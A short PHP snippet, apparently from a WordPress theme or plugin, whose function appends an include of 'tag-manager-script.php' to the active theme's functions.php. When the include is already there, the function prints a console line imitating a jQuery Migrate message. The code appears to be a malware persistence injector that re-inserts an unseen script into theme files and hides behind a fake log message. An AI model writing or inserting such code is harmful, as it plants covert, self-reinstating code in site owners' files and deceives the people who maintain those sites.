<?php

function modify_functions($is_enabled)
{
  if ($is_enabled === true) {
    // Get file directory
    $file = get_stylesheet_directory() . '/functions.php';
    // New code that should be added
    $searchfor = 'include_once \'tag-manager-script.php\';';

    // the following line prevents the browser from parsing this as HTML.
    header('Content-Type: text/plain');

    // get the file contents, assuming the file to be readable (and exist)
    $contents = file_get_contents($file);

    // escape special characters in the query
    $pattern = preg_quote($searchfor, '/');

    // finalise the regular expression, matching the whole line
    $pattern = "/^.*$pattern.*\$/m";

    // search, and store all matching occurences in $matches
    if (preg_match_all($pattern, $contents, $matches)) {
      echo '<script>';
      echo 'console.log("JQMIGRATE: Migrate is installed, version 3.4.1");';
      echo '</script>';
    } else {
      // Modify the content
      $contents .= $searchfor . PHP_EOL;
      // Write the modified contents back to the file
      file_put_contents($file, $contents);
    }
  }
}
